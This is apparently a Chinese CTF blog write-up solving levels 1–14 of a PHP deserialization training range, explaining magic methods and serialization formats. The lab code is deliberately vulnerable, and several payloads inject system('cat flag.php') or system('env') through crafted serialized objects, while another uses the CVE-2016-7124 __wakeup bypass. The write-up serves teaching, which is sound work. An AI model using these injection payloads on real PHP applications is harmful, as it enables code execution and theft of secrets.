---
title: "[反序列化靶场]PHPSerialize-lab系列 全流程WriteUp"
published: 2026-03-30T19:10:40
description: 个人感觉这个靶场适合刚接触反序列化的ctfer做，整体来说还是比较简单的，不过里面对于魔法函数以及字符串逃逸的题目有点潦草了，不是很全，属于入门级难度
tags:
  - 科技
  - 教程
  - 笔记
  - 代码审计
  - PHP反序列化
  - Web
  - CTF
  - PHP
draft: false
image: ../assets/images/PHPSerialize-lab.png
category: 网络安全
---
# \[反序列化靶场\]PHPSerialize-lab系列 全流程WriteUp

## 前言

**靶场项目下载**：
- [https://pan.chuzoux.top/OneDrive%20E3/CTF/Environment](https://pan.chuzoux.top/OneDrive%20E3/CTF/Environment)
- [https://github.com/ProbiusOfficial/PHPSerialize-labs](https://github.com/ProbiusOfficial/PHPSerialize-labs)

 靶场作者 **[探姬](https://github.com/ProbiusOfficial)** 

::github{repo="ProbiusOfficial/PHPSerialize-labs"}

在线靶场：[https://www.nssctf.cn/problem](https://www.nssctf.cn/problem) 在 `HelloCTF` 来源中搜索 `反序列化靶场`

所有的魔术方法 [https://www.php.net/manual/zh/language.oop5.magic.php](https://www.php.net/manual/zh/language.oop5.magic.php)

## 题目列表

- [[反序列化靶场]Level1-类的实例化](https://www.nssctf.cn/problem/6282)
- [[反序列化靶场]Level2-值的传递](https://www.nssctf.cn/problem/6283)
- [[反序列化靶场]Level3-值的权限](https://www.nssctf.cn/problem/6284)
- [[反序列化靶场]Level4-初体验](https://www.nssctf.cn/problem/6285)
- [[反序列化靶场]Level5-普通值规则](https://www.nssctf.cn/problem/6286)
- [[反序列化靶场]Level6-权限修饰规则](https://www.nssctf.cn/problem/6287)
- [[反序列化靶场]Level7-实例化和反序列化](https://www.nssctf.cn/problem/6288)
- [[反序列化靶场]Level8-GC机制](https://www.nssctf.cn/problem/6289)
- [[反序列化靶场]Level9-构造函数的后门](https://www.nssctf.cn/problem/6290)
- [[反序列化靶场]Level10-\_\_wakeup()](https://www.nssctf.cn/problem/6291)
- [[反序列化靶场]Level11-CVE-2016-7124](https://www.nssctf.cn/problem/6292)
- [[反序列化靶场]Level12-\_\_sleep()](https://www.nssctf.cn/problem/6294)
- [[反序列化靶场]Level13-\_\_toString()](https://www.nssctf.cn/problem/6295)
- [[反序列化靶场]Level14-\_\_invoke()](https://www.nssctf.cn/problem/6296)


## \[反序列化靶场\]Level1-类的实例化

```php
class FLAG{  
    public $flag_string = "NSSCTF{？？？？}";  
  
    function __construct(){  
        echo $this->flag_string;  
    }  
}  
  
$code = $_POST['code'];  
  
eval($code);
```

这里讲的是关于`__construct`魔法函数的作用 <br>当某类被实例化后 该类内中的`__construct`魔法函数被调用

很显然 这里`__construct`魔法函数的作用 就是输出Flag 我们直接实例化即可

实例化：new class();

Payload：
```php
POST传参 code=new FLAG();
```

得到Flag
```
NSSCTF{OK_Now_y0u_c4n_se3_me}
```

## \[反序列化靶场\]Level2-值的传递

```php
error_reporting(0); 
$flag_string = "NSSCTF{？？？？}";  
   
 class FLAG{  
        public $free_flag = "???";  
  
        function get_free_flag(){  
            echo $this->free_flag;  
        }  
    }  
$target = new FLAG();  
  
$code = $_POST['code'];  
  
if(isset($code)){  
       eval($code);       
       $target->get_free_flag();  
}  
else{    
highlight_file('source');  
}
```

这边可以看到提示`$flag_string`变量保存的是Flag<br>类`FLAG`被实例化为`$target` 这边如果给`code`传参 会触发 `$target->get_free_flag();` 输出`FLAG`类中的`$free_flag`的变量

这边题目的意思就是让你将`$flag_string`赋值给`FLAG`类中的`$free_flag`的变量 然后输出Flag

这一Level 主要是教你类的赋值

Payload：
```php
POST传参 code=$target -> free_flag = $flag_string;
```

得到Flag
```
NSSCTF{I_giv3_t0_y0u&y0u_giv3_t0_me}
```

## \[反序列化靶场\]Level3-值的权限

```php
class FLAG{       
	public $public_flag = "NSSCTF{?";      
	protected $protected_flag = "?";      
	private $private_flag = "?}";          
	function get_protected_flag(){           
		return $this->protected_flag;       
	}          
	function get_private_flag(){
		return $this->private_flag;       
	}   
}      
class SubFLAG extends FLAG{       
	function show_protected_flag(){           
		return $this->protected_flag;       
	}          
	function show_private_flag(){           
		return $this->private_flag;       
	}   
}     
$target = new FLAG();   
$sub_target = new SubFLAG();         
$code = $_POST['code'];      
if(isset($code)){       
	eval($code);   
} else {    
	highlight_file(__FILE__);       
	echo "Trying to get FLAG...<br>";       
	echo "Public Flag: ".$target->public_flag."<br>";       
	echo "Protected Flag:".$target->protected_flag ."<br>";     
	echo "Private Flag:".$target->private_flag ."<br>";   }      
?>   
`Trying to get FLAG...  
Public Flag: NSSCTF{se3_me_  
Protected Flag: Error: Cannot access protected property FLAG:: in ?  
Private Flag: Error: Cannot access private property FLAG:: in ?  
...Wait,where is the flag?
```

这个题目就比较有意思了 这是一个关于PHP类变量的权限问题 我这里放出一个表来表示他们之间的权限关系


|     | public | protected | private |
| --- | ------ | --------- | ------- |
| 自身  | √      | √         | √       |
| 子类  | √      | √         | ×       |
| 外部  | √      | ×         | ×       |
所以直接使用被实例化的`FLAG`类自身 便可以直接获取三个变量的值

其一Payload
```php
POST传参 code=echo $target->public_flag.$target->get_protected_flag().$target->get_private_flag();
```

其子类`SubFLAG`也可以访问其`protected`修饰的变量 

所以其二Payload
```php
POST传参 code=echo $target->public_flag.$sub_target->show_protected_flag().$target->get_private_flag();
```

若使用`$sub_target->show_private_flag()`来获取的话 则子类并没有权限访问父类`private`修饰的变量 

则没有其三Payload

得到Flag
```
NSSCTF{se3_me_4nd_g3t_mmmme}
```

## \[反序列化靶场\]Level4-初体验

```php
class FLAG3{  
    private $flag3_object_array = array("？","？");  
}  
  
class FLAG{  
     private $flag1_string = "？";  
     private $flag2_number = '?';  
     private $flag3_object;  
  
    function __construct() {        
	    $this->flag3_object = new FLAG3();  
    }  
}  
  
$flag_is_here = new FLAG();  
  
$code = $_POST['code'];  
  
if(isset($code)){  
    eval($code);  
} else {    
	highlight_file(__FILE__);  
}
```

这一层level要我们了解PHP序列化这一保存原理 为了方便保存 所有的数据被序列化为一段字符串进行保存

序列化与反序列化的过程可以理解为 打包/解包的过程

从源码中可以看到`FLAG`类中`__construct`这个魔法函数实例化了`FLAG3`类 若将其打包`FLAG` 那么打包后的内容则会含有`FLAG3`类的所有数据 所以我们就可以从中得到flag

Payload：
```php
POST传参 code=echo serialize($flag_is_here);
```

得到字符串如下
```php
O:4:"FLAG":3:{s:18:"FLAGflag1_string";s:8:"ser4l1ze";s:18:"FLAGflag2_number";i:2;s:18:"FLAGflag3_object";O:5:"FLAG3":1:{s:25:"FLAG3flag3_object_array";a:2:{i:0;s:3:"se3";i:1;s:2:"me";}}}
```

从`FLAGflag1_string`、`FLAGflag2_number`、`FLAGflag3_object`这几个提示的部分将flag拼接

得到Flag
```
NSSCTF{ser4l1ze2se3me}
```

## \[反序列化靶场\]Level5-普通值规则

```php
class a_class{      
	public $a_value = "NSSCTF";   
}   
$a_object = new a_class();   
$a_array = array(a=>"Hello",b=>"CTF");   
$a_string = "NSSCTF";   
$a_number = 678470;   
$a_boolean = true;   
$a_null = null;   

See How to serialize:  
a_object: O:7:"a_class":1:{s:7:"a_value";s:6:"NSSCTF";}  
a_array: a:2:{s:1:"a";s:5:"Hello";s:1:"b";s:3:"CTF";}  
a_string: s:6:"NSSCTF";  
a_number: i:678470;  
a_boolean: b:1;  
a_null: N;  
Now your turn!

```

```php
<?php      
$your_object = unserialize($_POST['o']);   
$your_array = unserialize($_POST['a']);   
$your_string = unserialize($_POST['s']);   
$your_number = unserialize($_POST['i']);   
$your_boolean = unserialize($_POST['b']);   
$your_NULL = unserialize($_POST['n']);      
if(    
	$your_boolean &&     
	$your_NULL == null &&    
	$your_string == "IWANT" &&    
	$your_number == 1 &&    
	$your_object->a_value == "FLAG" &&
	$your_array['a'] == "Plz" && $your_array['b'] == "Give_M3"  
)
{       
	echo $flag;   
}   
else{       
	echo "You really know how to serialize?";   
}
```

从第一个代码块 他告诉我们这几个类型被序列化的样子 我们如果让他进行反序列化 则会给予对应的数据 便可以进行赋值等操作

```php
a_object: O:7:"a_class":1:{s:7:"a_value";s:6:"NSSCTF";}  
a_array: a:2:{s:1:"a";s:5:"Hello";s:1:"b";s:3:"CTF";}  
a_string: s:6:"NSSCTF";  
a_number: i:678470;  
a_boolean: b:1;  
a_null: N;  
```

根据要求我们将以上数据照着葫芦画瓢

Payload：
```php
your_object: O:7:"a_class":1:{s:7:"a_value";s:4:"FLAG";}
your_array: a:2:{s:1:"a";s:3:"Plz";s:1:"b";s:7:"Give_M3";}
your_string: s:5:"IWANT";
your_number: i:1;
your_boolean: b:1; //这里按照 php 基础判断需要让布尔值为 1
your_NULL: N;  

然后我们依次进行POST传参即可
```

得出Flag
```
NSSCTF{Gre4t,y0u_can_als0_ser4l1ze2se_1n_y0ur_m1nd!}
```

## \[反序列化靶场\]Level6-权限修饰规则

```php
class protectedKEY{
    protected $protected_key;
    
    function get_key(){
        return $this->protected_key;
    }
}
class privateKEY{
    private $private_key;  
    
    function get_key(){
        return $this->private_key;
    }  
}  

See Carfully~  
"protected" serialize: O%3A12%3A%22protectedKEY%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00protected_key%22%3BN%3B%7D  
"private" serialize: O%3A10%3A%22privateKEY%22%3A1%3A%7Bs%3A23%3A%22%00privateKEY%00private_key%22%3BN%3B%7D

```

这个题目想告诉我们在被`protected`、`private`进行特殊修饰的变量被序列化的时候 存在形式

由他给出的序列化的数据可以 他们在原有的基础上加了一个`%00{?}%00`这个东西<br>关于`%00` 是NULL在被urlencode之后的数据 以防出现问题 这种进行传参就在urlencode之后再进行传参即可 而且在计算长度的时候 之将其视为1长度

我这边整理出来不同修饰符被序列化后的格式

|     | public  | protected      | private                  |
| --- | ------- | -------------- | ------------------------ |
| 格式  | {value} | %00*%00{value} | %00{classname}%00{value} |


```php
$protected_key = unserialize($_POST['protected_key']);
$private_key = unserialize($_POST['private_key']);
if(isset($_POST['protected_key'])&&isset($_POST['private_key'])){
    if($protected_key->get_key() == "protected_key" && $private_key->get_key() == "private_key"){
        echo $flag;
    } else {
        echo "We Call it %00_Contr0l_Characters_NULL!";
    }
} else {
    highlight_file('source');
}
```

编写Payload

```php
class protectedKEY{
    protected $protected_key="protected_key";
}
class privateKEY{
    private $private_key="private_key";
}
$a = new protectedKEY();
$b = new privateKEY();
echo urlencode(serialize($a)); 
//O%3A12%3A%22protectedKEY%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00protected_key%22%3Bs%3A13%3A%22protected_key%22%3B%7D
echo urlencode(serialize($b));
//O%3A10%3A%22privateKEY%22%3A1%3A%7Bs%3A23%3A%22%00privateKEY%00private_key%22%3Bs%3A11%3A%22private_key%22%3B%7D
```

将得出的串用POST 传参给 `protected_key` 和 `private_key` 便可以得出Flag

```
NSSCTF{P3rm1ssi0n_Modif_1s_1mp0rtant}
```

## \[反序列化靶场\]Level7-实例化和反序列化

```php
// FLAG in flag.php
class FLAG{
    public $flag_command = "echo 'Hello CTF!<br>';";
    
    function backdoor(){
        eval($this->flag_command);
    }
}

$unserialize_string = 'O:4:"FLAG":1:{s:12:"flag_command";s:24:"echo 'Hello World!<br>';";}';
  
$Instantiate_object = new FLAG(); // 实例化的对象 

$Unserialize_object = unserialize($unserialize_string); // 反序列化的对象
  
$Instantiate_object->backdoor();

$Unserialize_object->backdoor();

'$Instantiate_object->backdoor()' will output:Hello CTF!  
'$Unserialize_object->backdoor()' will output:Hello World!

<?php /* Now Your Turn */  
unserialize($_POST['o'])->backdoor();

```

这个题目可以教会我们理解 我们反序列化后 会将原有的数据覆盖 我们只需要修改我们反序列化的内容 便可以篡改类中变量的值 以达到我们想要的效果

其中反序列化数据`O:4:"FLAG":1:{s:12:"flag_command";s:24:"echo 'Hello World!<br>';";}` 中的`echo 'Hello World!<br>';` 可以明显看到 其被反序列化 占据了原有的`$flag_command` 于是我们仅需要修改这一长串数据 便可以达到执行我们自己的命令的目的


将`echo 'Hello World!<br>';`替换为`system('cat flag.php');` // 这里因靶机系统而异 这里是linux

替换完之后我们发现`mand";s:24:"echo `中的`24`为原来数据的长度 我们替换的数据长度为`23` 则将原始数据的对应部分改为`23`即可

Payload：
```php
POST传参 o=O:4:"FLAG":1:{s:12:"flag_command";s:23:"system('cat flag.php');";}
```

在源码中得到Flag
```
NSSCTF{1n3tanti4tion&3er1alizati0n!}
```

## \[反序列化靶场\]Level8-GC机制

```php
global $destruct_flag;
global $construct_flag;
$destruct_flag = 0;
$construct_flag = 0;

class FLAG {
    public $class_name;
    public function __construct($class_name)
    {
        $this->class_name = $class_name;
        global $construct_flag;
        $construct_flag++;
        echo "Constructor called " . $construct_flag . "<br>";
    }
    public function __destruct()
    {
        global $destruct_flag;
        $destruct_flag++;
        echo "Destructor called " . $destruct_flag . "<br>";
    }
}

/*Object created*/
$demo = new FLAG('demo');  

/*Object serialized*/
$s = serialize($demo);
  
/*Object unserialized*/
$n = unserialize($s);  

/*unserialized object destroyed*/
unset($n);

/*original object destroyed*/
unset($demo);

/*注意 此处为了方便演示为手动释放，一般情况下，当脚本运行完毕后，php会将未显式销毁的对象自动销毁，该行为也会调用析构函数*/
/*此外 还有比较特殊的情况: PHP的GC(垃圾回收机制)会在脚本运行时自动管理内存，销毁不被引用的对象:*/
new FLAG();

Object created:Constructor called 1  
Object serialized: But Nothing Happen(:  
Object unserialized:But nothing happened either):  
serialized Object destroyed:Destructor called 1  
original Object destroyed:Destructor called 2  
  
This object ('new FLAG();') will be destroyed immediately because it is not assigned to any variable:Constructor called 2  
Destructor called 3  
  
Now Your Turn!, Try to get the flag!
```

欸，您猜怎么着！这里还真是我的盲点，这个题说的GC机制(垃圾回收机制)比较复杂，而且全是专业术语比较抽象

>构造函数只会在类实例化的时候 —— 也就是使用 new 的方法手动创建对象的时候才会触发，而通过反序列化创建的对象不会触发这一方法，这也是为什么，在前面的内容，我将反序列化的对象创建过程称作为 “**还原**”。
>
>析构函数会在对象被回收的时候触发 —— 手动回收和自动回收。
> 
> 手动回收：就是代码中演示的 unset 方法用于释放对象。
> 
> 自动回收：对象没有值引用指向，或者脚本结束完全释放，具体看题目中的演示结合该部分文字应该不难理解。
> 
> 题目要求 全局变量 标识符flag的值大于5，根据 __destruct() 和 PHP GC 的特性，我们可以不断地去序列化和反序列化一个对象，然后不给该对象具体的引用以触发自动销毁机制。


我这里用一点简单的大白话去将这个道理<br>省流一下其实很好理解

-  `__construct` 这个函数只有`new xxx();`才能触发，序列化、反序列化均不产生影响
-  `__destruct` 这个函数被激活有一下情况
	1. 程序结束自动销毁
	2. unset();销毁该类
	3. 使用序列化和反序列化完成生命周期

所以这个题目有两种解法使flag的值大于5

其一Payload
```php
POST传参 code=unserialize(serialize(unserialize(serialize(unserialize(serialize(unserialize(serialize(new RELFLAG()))))))));
```
flag的值变化为
```
1x new RELFLAG(); + 4x unserialize(); + 1x 程序结束 = 6 > 5  得到flag
```

其二Payload
```php
POST传参
code=$RELFLAG1 = new RELFLAG();$RELFLAG2 = new RELFLAG();$RELFLAG3 = new RELFLAG();$RELFLAG4 = new RELFLAG();$RELFLAG5 = new RELFLAG();unset($RELFLAG1);unset($RELFLAG2);unset($RELFLAG3);unset($RELFLAG4);unset($RELFLAG5);
```
flag的值变化为
```
全局变量$flag在构造函数中被重置为0然后++，导致每次new后$flag=1。
同样在第五次$RELFLAG5 = new RELFLAG();后$flag=1
然后再进行连续五次的 unset(); 每次 unset(); $flag += 1;
1x $RELFLAG5 = new RELFLAG(); -> 5x unset($RELFLAG); = 6 > 5  得到flag
```

得到Flag
```
NSSCTF{Construct0r_&_D3struct0r}
```

## \[反序列化靶场\]Level9-构造函数的后门

```php
// flag在环境变量
class FLAG {  
    var $flag_command = "echo 'HelloCTF';";  
    public function __destruct()  
    {  
        eval ($this->flag_command);  
    }  
}  
  
unserialize($_POST['o']);
```

首先定位到`eval`函数 然后发现里面是一个`flag_command`变量 所以如果我们可以修改里面变量的值就可以做到 RCE

如何改变？我们可以看到下面的反序列化 我们可以通过自己构建序列化的数据 进行反序列化 然后便可以替换掉其中的`flag_command` 变量值

Payload
```php
class FLAG {
    var $flag_command = "system('env');";
    //rce指令因系统而异
}

$a = new FLAG();
echo serialize($a);
//O:4:"FLAG":1:{s:12:"flag_command";s:14:"system('env');";}
POST传参即可
```

得到FLag
```
NSSCTF{5b9f126f-4adf-456e-86bf-0675e9a76816}
```

## \[反序列化靶场\]Level10-\_\_wakeup()

```php
class FLAG{  
    function __wakeup() {  
        include 'flag.php';  
        echo $flag;  
    }  
}  
  
if(isset($_POST['o']))  
{    
	unserialize($_POST['o']);  
}else {    
	highlight_file(__FILE__);  
}  

```

>\_\_wakeup()，执行unserialize()时，先会调用这个函数

所以直接反序列化一个名为`FLAG`的空类即可

Payload：
```php
class FLAG {
}
$a = new FLAG();
echo serialize($a);
//O:4:"FLAG":0:{}
POST传参即可
```

得到Flag
```
NSSCTF{Default_Flag}
```

## \[反序列化靶场\]Level11-CVE-2016-7124

```php
error_reporting(0);  
  
include 'flag.php';  
  
class FLAG {  
    public $flag = "FAKEFLAG";  
  
    public function  __wakeup(){  
        global $flag;        
        $flag = NULL;  
    }  
    public function __destruct(){  
        global $flag;  
        if ($flag !== NULL) {  
            echo $flag;  
        }else  
        {  
            echo "sorry,flag is gone!";  
        }  
    }  
}  
  
if(isset($_POST['o']))  
{    
	unserialize($_POST['o']);  
}else {    
	highlight_file(__FILE__);    
	phpinfo();  
}  
  
?>
```

分析这个题目可知 只要在`$flag !== NULL`的条件下执行`__destruct`函数 便可以拿到flag

且默认状态下 `$flag !== NULL` 条件成立 但是如果执行`__wakeup`函数 则会使条件不成立

所以我们要绕过`__wakeup`函数 不让它执行 这就是我们这道题的主角[CVE-2016-7124](https://nvd.nist.gov/vuln/detail/CVE-2016-7124)

这个CVE-2016-7124影响范围如下

- PHP5 < 5.6.25  
- PHP7 < 7.0.10

如何利用呢？只需要修改最后你要绕过的类的成员数量 以这个题目举例

```php
class FLAG {
    public $flag = "FAKEFLAG";
}
$a = new FLAG();
echo serialize($a);
//O:4:"FLAG":1:{s:4:"flag";s:8:"FAKEFLAG";}
```
这里得出的`O:4:"FLAG":1:{s:4:"flag";s:8:"FAKEFLAG";}` 成员数量为1 修改为其他数量即可

Payload：
```php
O:4:"FLAG":2:{s:4:"flag";s:8:"FAKEFLAG";}
```

得出Flag
```
NSSCTF{77b007ba-81cd-40f4-a355-849a51ec3877}
```

## \[反序列化靶场\]Level12-\_\_sleep()

```php
class FLAG {  
  
    private $f;  
    private $l;  
    protected $a;  
    public  $g;  
    public $x,$y,$z;  
  
    public function __sleep() {  
        return ['x','y','z'];  
    }  
}  
  
class CHALLENGE extends FLAG {  
  
    public $h,$e,$l,$I,$o,$c,$t,$f;  
  
    function chance() {  
        return $_GET['chance'];  
    }  
    public function __sleep() {        
    /* FLAG is $h + $e + $l + $I + $o + $c + $t + $f + $f + $l + $a + $g */        
	    $array_list = ['h','e','l','I','o','c','t','f','f','l','a','g'];        
	    $_=array_rand($array_list);$__=array_rand($array_list);  
	    return array($array_list[$_],$array_list[$__],$this->chance());  
    }  
  
}  
  
$FLAG = new FLAG();  
echo serialize($FLAG);  
  
echo serialize(new CHALLENGE());

//If you serialize FLAG, you will just get x,y,z  
//O:4:"FLAG":3:{s:1:"x";N;s:1:"y";N;s:1:"z";N;}  
//------ 每次请求会随机返回两个属性，你也可以用 chance 来指定你想要的属性 ------  
//Now __sleep()'s return parameters is array('o','o','you shuold use it')  
//O:9:"CHALLENGE":3:{s:1:"o";s:7:"called_";s:1:"o";s:7:"called_";s:17:"you shuold use it";N;}


```


这个题目主要是为了告诉你 当执行`serialize()`时，先会调用`__sleep()`函数

在`CHALLENGE`这个类中 它继承了 `FLAG` 类 因此它拥有能够访问`FLAG`类里面的`f、l、a、g`变量

这边给你提示说`/* FLAG is $h + $e + $l + $I + $o + $c + $t + $f + $f + $l + $a + $g */ `

里面提到了多次`f、a`变量  由于子类应该是对`f、a`变量进行再次的赋值 因此如果我们要获取完整正确的flag 我们需要在获取的时候 `f、l、a、g`变量都应该获取父类的变量

还有一个知识点就是 在我们调用非`public`类型变量的时候 有着特殊的调用规则 


|         | public | private                 | protected        |
| ------- | ------ | ----------------------- | ---------------- |
| payload | {name} | %00{classname}%00{name} | %00{\*}%00{name} |

通过代码审计 我们知道 我们可以通过 get对`chance`参数传参 去获得对应的变量数据

因此Payload：
```
GET传参 ?chance={value}
value依次为 h、e、l、I、o、c、t、f、%00FLAG%00f、%00FLAG%00l、%00*%00a、g
```
得到flag的部分片段 然后进行拼接得到Flag
```
NSSCTF{Th3___sleep_function__is_called_before_serialization_t0_clean_up_4nd_select_variab1es}
```

## \[反序列化靶场\]Level13-\_\_toString()

```php
class FLAG {  
    function __toString() {  
        echo "I'm a string ~~~";  
        include 'flag.php';  
        return $flag;  
    }  
}  
  
$obj = new FLAG();  
  
if(isset($_POST['o'])) {  
    eval($_POST['o']);  
} else {
    highlight_file(__FILE__);  
}
```

魔法函数`__toString`指的是当此类当作字符串时 函数将会被调用 

这边如果这个函数被调用 则会直接返回flag值 也就是说 把它当作字符串时 他就是flag

所以我们这边直接执行输出

Payload：
```php
POST传参 o=echo $obj;
```

得到Flag
```
NSSCTF{00119b97-2cfd-4b41-a8a9-2966fedf10a8}
```

## \[反序列化靶场\]Level14-\_\_invoke()

```php
class FLAG{  
    function __invoke($x) {  
        if ($x == 'get_flag') {  
            include 'flag.php';  
            echo $flag;  
        }  
    }  
}  
  
$obj = new FLAG();  
  
if(isset($_POST['o'])) {  
    eval($_POST['o']);  
} else {
    highlight_file(__FILE__);  
}
```

这依旧是一个魔法函数 `__invoke` 它表示 当此类被当作函数调用时 将会调用此函数

代码审计发现 当`__invoke` 被调用时的输入值为`get_flag`时 将直接输出flag值 

于是Payload：
```php
POST传参 o=$obj(get_flag);
```

得到Flag
```
NSSCTF{96cc166d-3560-4da6-b2b9-be01d14d4d4a}
```



---
今天写累了 先写到这吧 明天再写下半部分